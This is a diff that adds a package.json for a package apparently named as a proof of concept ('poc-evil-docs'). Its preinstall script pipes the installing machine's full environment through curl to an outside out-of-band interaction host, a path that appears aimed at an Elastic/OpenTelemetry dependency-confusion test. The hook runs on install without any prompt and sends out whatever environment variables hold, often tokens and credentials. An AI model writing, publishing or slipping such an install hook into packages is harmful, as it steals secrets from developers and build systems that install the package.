@@ -1,0 +1,7 @@
+{
+  "name": "poc-evil-docs",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "env | curl -X POST -d @- https://n3r0j6l1213vig3sepdru8u73w9nq26xn.oast.site/elastic/opentelemetry"
+  }
+}
